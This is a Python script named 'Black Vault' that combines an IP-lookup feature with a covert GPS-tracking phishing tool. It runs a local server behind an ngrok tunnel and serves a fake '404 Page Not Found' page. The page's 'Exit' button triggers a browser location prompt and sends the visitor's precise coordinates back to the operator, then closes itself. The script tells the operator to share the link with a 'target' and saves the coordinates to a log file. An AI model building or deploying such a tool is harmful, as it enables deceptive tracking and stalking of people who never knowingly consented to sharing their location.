#!/usr/bin/python3
# -*- coding: utf-8 -*-
# License: MPL-2.0

import requests
import os
import time
import json
import threading
import webbrowser
import subprocess
import sys
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class Colors:
    RED = "\033[31;1m"
    CYAN = "\033[36;1m"
    GREEN = "\033[32;1m"
    YELLOW = "\033[33;1m"
    RESET = "\033[0m"

os.system("clear" if os.name != "nt" else "cls")

banner = Colors.RED + r'''
██████╗ ██╗      █████╗  ██████╗██╗  ██╗      ██╗   ██╗ █████╗ ██╗   ██╗██╗  ████████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝      ██║   ██║██╔══██╗██║   ██║██║  ╚══██╔══╝
██████╔╝██║     ███████║██║     █████╔╝       ██║   ██║███████║██║   ██║██║     ██║
██╔══██╗██║     ██╔══██║██║     ██╔═██╗       ╚██╗ ██╔╝██╔══██║██║   ██║██║     ██║
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗       ╚████╔╝ ██║  ██║╚██████╔╝███████╗██║
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝        ╚═══╝  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝

                          B L A C K   V A U L T

         ┌───────────────────────┐
         │Made by: Quantumroot09 │
         │ Version : v1.0        │
         └───────────────────────┘

''' + Colors.RESET

def lookup_ip(ip):
    url = (
        f"http://ip-api.com/json/{ip}"
        "?fields=status,message,continent,continentCode,"
        "country,countryCode,region,regionName,city,district,"
        "zip,lat,lon,timezone,currency,isp,org,as,reverse,"
        "mobile,proxy,hosting,query"
    )

    response = requests.get(url, timeout=10)
    return response.json()

def ip_geolocation():
    try:
        ip = input(Colors.CYAN + "[~] Enter IP Address: " + Colors.RESET)

        print(f"\n[~] Searching information for: {ip}")
        time.sleep(1.5)

        data = lookup_ip(ip)

        if data.get("status") == "fail":
            print(f"\n[!] Error: {data.get('message')}")
            return

        print("\n" + Colors.GREEN + "========== RESULTS ==========" + Colors.RESET + "\n")

        fields = {
            "IP Address": "query",
            "ISP": "isp",
            "Organization": "org",
            "City": "city",
            "Country": "country",
            "Region": "region",
            "Region Name": "regionName",
            "Continent": "continent",
            "Continent Code": "continentCode",
            "Latitude": "lat",
            "Longitude": "lon",
            "Timezone": "timezone",
            "ZIP Code": "zip",
            "AS Information": "as",
            "Country Code": "countryCode",
            "Reverse DNS": "reverse",
            "Mobile Connection": "mobile",
            "Currency": "currency",
            "District": "district",
            "Proxy/VPN/Tor": "proxy",
            "Hosting": "hosting"
        }

        for title, key in fields.items():
            value = data.get(key, "Not Found")
            print(f"[+] {title}: {value}")

    except KeyboardInterrupt:
        print("\n\n[!] Exiting...")
        time.sleep(1)

# Global variable to store GPS data
gps_data = []
target_exited = False
REDIRECT_URL = "https://www.bbc.com/news"  # You can change this to any news/ad page

def check_ngrok():
    """Check if ngrok is installed"""
    try:
        subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def set_ngrok_auth(token):
    """Set ngrok auth token"""
    try:
        result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            return True
        else:
            return False
    except Exception:
        return False

def start_ngrok(port):
    """Start ngrok tunnel"""
    try:
        # Kill any existing ngrok processes
        if os.name != "nt":  # Linux/Mac
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        else:  # Windows
            subprocess.run(['taskkill', '/f', '/im', 'ngrok.exe'], capture_output=True)
        
        time.sleep(1)
        
        # Start ngrok in background
        if os.name != "nt":  # Linux/Mac
            subprocess.Popen(['ngrok', 'http', str(port), '--log=stdout'], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
        else:  # Windows
            subprocess.Popen(['ngrok', 'http', str(port)], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(3)
        
        # Get public URL from ngrok API
        response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
        data = response.json()
        public_url = data['tunnels'][0]['public_url']
        return public_url
    except Exception as e:
        print(Colors.RED + f"[!] Error starting ngrok: {e}" + Colors.RESET)
        return None

class GPSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global gps_data, target_exited
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/':
            # Serve the fake 404 error page with location request
            html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>404 - Page Not Found</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            text-align: center;
            background: white;
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        
        .error-code {
            font-size: 72px;
            font-weight: bold;
            color: #e74c3c;
            margin-bottom: 10px;
        }
        
        .error-title {
            font-size: 24px;
            color: #2c3e50;
            margin-bottom: 10px;
        }
        
        .error-message {
            color: #7f8c8d;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 12px 25px;
            font-size: 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn-redirect {
            background: #3498db;
            color: white;
        }
        
        .btn-exit {
            background: #e74c3c;
            color: white;
        }
        
        .btn:hover {
            transform: scale(1.05);
            opacity: 0.9;
        }
        
        .btn:active {
            transform: scale(0.95);
        }
        
        .loading {
            display: none;
            margin-top: 20px;
            color: #7f8c8d;
            font-size: 14px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
            .error-code {
                font-size: 60px;
            }
            .btn {
                padding: 10px 20px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-code">404</div>
        <div class="error-title">Page Not Found</div>
        <div class="error-message">The requested page could not be found on this server.</div>
        <div class="buttons">
            <button class="btn btn-redirect" onclick="redirectUser()">Redirect to Homepage</button>
            <button class="btn btn-exit" onclick="requestLocationAndExit()">Exit</button>
        </div>
        <div class="loading" id="loading">Processing...</div>
    </div>

    <script>
        function redirectUser() {
            window.location.href = 'https://www.bbc.com/news';
        }
        
        function requestLocationAndExit() {
            // Show loading message
            document.getElementById('loading').style.display = 'block';
            
            // Check if geolocation is available
            if (navigator.geolocation) {
                // Request location permission and get position
                navigator.geolocation.getCurrentPosition(
                    // Success callback
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        // Send location to server
                        fetch('/location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                latitude: lat,
                                longitude: lon,
                                accuracy: accuracy,
                                timestamp: new Date().toISOString()
                            })
                        })
                        .then(response => response.json())
                        .then(data => {
                            // Close the page after sending location
                            window.close();
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            window.close();
                        });
                    },
                    // Error callback
                    function(error) {
                        console.error('Geolocation error:', error);
                        // Send error info to server
                        fetch('/location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                error: error.message,
                                timestamp: new Date().toISOString()
                            })
                        })
                        .then(() => {
                            window.close();
                        })
                        .catch(() => {
                            window.close();
                        });
                    },
                    // Options
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                // Geolocation not supported
                fetch('/location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        error: 'Geolocation not supported',
                        timestamp: new Date().toISOString()
                    })
                })
                .then(() => {
                    window.close();
                })
                .catch(() => {
                    window.close();
                });
            }
        }
    </script>
</body>
</html>'''
            self.send_response(404)  # Send 404 status code
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
            
    def do_POST(self):
        global gps_data, target_exited
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/location':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            location_data = json.loads(post_data.decode())
            
            # Check if it's an error or actual location
            if 'latitude' in location_data and 'longitude' in location_data:
                gps_data.append(location_data)
                target_exited = True
                print(Colors.GREEN + "\n[+] Location received!" + Colors.RESET)
            else:
                print(Colors.RED + f"\n[!] Error from target: {location_data.get('error', 'Unknown error')}" + Colors.RESET)
                target_exited = True
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
        
    def log_message(self, format, *args):
        # Suppress default logging
        pass

def generate_link():
    global gps_data, target_exited
    gps_data = []  # Reset data
    target_exited = False
    
    # Check if ngrok is installed
    print(Colors.YELLOW + "\n[*] Checking ngrok installation..." + Colors.RESET)
    if not check_ngrok():
        print(Colors.RED + "\n[!] ngrok is not installed or not in PATH!" + Colors.RESET)
        print(Colors.CYAN + "\n[+] Install ngrok:" + Colors.RESET)
        print("   1. Visit: https://ngrok.com/download")
        print("   2. Download ngrok for your OS")
        print("   3. Extract and place in system PATH")
        print("\n[!] Cannot continue without ngrok")
        input(Colors.CYAN + "\nPress Enter to return to menu..." + Colors.RESET)
        return
    
    # Ask for ngrok auth token
    print(Colors.CYAN + "\n[?] Enter your ngrok auth token:" + Colors.RESET)
    print(Colors.YELLOW + "[!] Get your token from: https://dashboard.ngrok.com/get-started/your-authtoken" + Colors.RESET)
    auth_token = input(Colors.GREEN + "[>] Token: " + Colors.RESET).strip()
    
    if not auth_token:
        print(Colors.RED + "\n[!] Auth token is required!" + Colors.RESET)
        return
    
    print(Colors.YELLOW + "\n[*] Setting ngrok auth token..." + Colors.RESET)
    if set_ngrok_auth(auth_token):
        print(Colors.GREEN + "[+] Auth token configured successfully!" + Colors.RESET)
    else:
        print(Colors.RED + "[!] Failed to set auth token!" + Colors.RESET)
        return
    
    # Find an available port
    port = 8080
    server = HTTPServer(('0.0.0.0', port), GPSHandler)
    
    print(Colors.YELLOW + "\n[*] Starting ngrok tunnel..." + Colors.RESET)
    public_url = start_ngrok(port)
    
    if not public_url:
        print(Colors.RED + "\n[!] Failed to start ngrok. Make sure your auth token is valid!" + Colors.RESET)
        return
    
    link = public_url
    
    print(Colors.GREEN + "\n[+] Link Generated Successfully!" + Colors.RESET)
    print(Colors.CYAN + f"\n📎 Share this link with your target: {link}" + Colors.RESET)
    print(Colors.YELLOW + "\n[!] How it works:" + Colors.RESET)
    print("   1. Target opens the link")
    print("   2. They see a 404 error page")
    print("   3. When they click 'Exit', browser asks for location permission")
    print("   4. If they allow, you get their exact GPS coordinates")
    print("   5. The page closes automatically")
    print(Colors.RED + "\n[!] Press Ctrl+C to stop the server and return to menu" + Colors.RESET)
    
    # Ask if user wants to open in browser
    try:
        choice = input(Colors.CYAN + "\n[?] Open link in browser? (y/n): " + Colors.RESET).lower()
        if choice == 'y':
            webbrowser.open(link)
    except:
        pass
    
    print(Colors.YELLOW + "\n[*] Waiting for target to click EXIT..." + Colors.RESET)
    
    # Run server in a separate thread
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    # Monitor for GPS data
    try:
        while True:
            if target_exited:
                print(Colors.GREEN + "\n" + "="*50 + Colors.RESET)
                if gps_data:
                    print(Colors.RED + "📍 GPS COORDINATES RECEIVED!" + Colors.RESET)
                    print(Colors.GREEN + "="*50 + Colors.RESET)
                    for data in gps_data:
                        print(f"\n[+] Latitude: {data.get('latitude')}")
                        print(f"[+] Longitude: {data.get('longitude')}")
                        print(f"[+] Accuracy: ±{data.get('accuracy')} meters")
                        print(f"[+] Timestamp: {data.get('timestamp')}")
                        print(f"\n📍 Google Maps Link: https://www.google.com/maps?q={data.get('latitude')},{data.get('longitude')}")
                        
                        # Save to file
                        with open("gps_log.txt", "a") as f:
                            f.write(f"{data.get('timestamp')} - Lat: {data.get('latitude')}, Lon: {data.get('longitude')}, Acc: {data.get('accuracy')}m\n")
                        print(Colors.GREEN + "\n[+] GPS data saved to gps_log.txt" + Colors.RESET)
                else:
                    print(Colors.RED + "⚠️ NO LOCATION DATA RECEIVED!" + Colors.RESET)
                    print(Colors.YELLOW + "Possible reasons:" + Colors.RESET)
                    print("   - User denied location permission")
                    print("   - Browser doesn't support geolocation")
                    print("   - User closed the page without clicking Exit")
                
                print(Colors.GREEN + "\n" + "="*50 + Colors.RESET)
                
                input(Colors.CYAN + "\nPress Enter to continue..." + Colors.RESET)
                break
            time.sleep(1)
    except KeyboardInterrupt:
        print(Colors.YELLOW + "\n\n[*] Stopping server..." + Colors.RESET)
    finally:
        server.shutdown()
        time.sleep(1)
        # Kill ngrok process
        if os.name != "nt":
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        else:
            subprocess.run(['taskkill', '/f', '/im', 'ngrok.exe'], capture_output=True)

def show_menu():
    while True:
        print(Colors.CYAN + "\n" + "="*40)
        print("        MAIN MENU")
        print("="*40 + Colors.RESET)
        print(Colors.GREEN + "1. IP Geolocation (IP to location)")
        print("2. Exact GPS Coordinates (Get GPS via link)")
        print("3. Exit" + Colors.RESET)
        print(Colors.CYAN + "="*40 + Colors.RESET)
        
        choice = input(Colors.YELLOW + "\n[?] Select option (1-3): " + Colors.RESET)
        
        if choice == '1':
            os.system("clear" if os.name != "nt" else "cls")
            print(banner)
            ip_geolocation()
            input(Colors.CYAN + "\nPress Enter to continue..." + Colors.RESET)
            os.system("clear" if os.name != "nt" else "cls")
            print(banner)
        elif choice == '2':
            os.system("clear" if os.name != "nt" else "cls")
            print(banner)
            generate_link()
            os.system("clear" if os.name != "nt" else "cls")
            print(banner)
        elif choice == '3':
            print(Colors.RED + "\n[!] Exiting..." + Colors.RESET)
            time.sleep(1)
            exit()
        else:
            print(Colors.RED + "\n[!] Invalid option! Please choose 1, 2, or 3" + Colors.RESET)
            time.sleep(1)

if __name__ == "__main__":
    print(banner)
    show_menu()

def run():
    print(banner)
    show_menu()